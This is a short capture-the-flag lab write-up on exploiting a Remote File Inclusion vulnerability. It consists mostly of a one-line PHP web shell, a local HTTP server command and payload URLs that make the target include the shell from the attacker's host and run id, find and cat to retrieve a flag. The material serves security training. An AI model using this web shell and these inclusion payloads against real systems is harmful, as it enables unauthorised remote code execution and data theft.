# [Remote File Inclusion (RFI)](Remote%20File%20Inclusion%20(RFI).md)
### Attack the target, gain command execution by exploiting the RFI vulnerability, and then look for the flag under one of the directories in /

```shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

sudo python3 -m http.server 1234
```
![](Screenshot%202026-06-30%20at%2016.19.49.png)

```url
http://10.129.29.114/index.php?language=http://10.10.15.119:1234/shell.php&cmd=id
```
![](Screenshot%202026-06-30%20at%2016.20.45.png)

```url
http://10.129.29.114/index.php?language=http://10.10.15.119:1234/shell.php&cmd=find%20/%20-name%20%27flag.txt%27%202%3E/dev/null
```
![](Screenshot%202026-06-30%20at%2016.38.53.png)

```url
http://10.129.29.114/index.php?language=http://10.10.15.119:1234/shell.php&cmd=cat%20/exercise/flag.txt
```
![](Screenshot%202026-06-30%20at%2016.39.35.png)
